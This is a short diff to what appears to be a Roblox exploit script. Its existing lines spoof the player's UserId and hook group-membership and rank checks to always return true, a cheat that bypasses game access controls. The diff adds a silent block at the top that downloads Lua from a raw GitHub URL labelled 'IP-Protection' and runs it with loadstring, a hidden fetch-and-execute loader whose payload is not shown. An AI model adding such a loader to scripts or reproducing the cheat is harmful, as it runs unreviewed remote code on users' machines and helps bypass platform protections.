@@ -1,3 +1,7 @@
+pcall(function()
+local project = "IP-Protection"
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/RbxSolutions/IP-Protection/main/source.lua"):format(project), true))()
+end)
 game.Players.LocalPlayer.UserId = "2266274327"
 hookfunction(game.Players.LocalPlayer.IsInGroup, function() return true end)
 hookfunction(game.Players.LocalPlayer.GetRankInGroup, function() return true end)
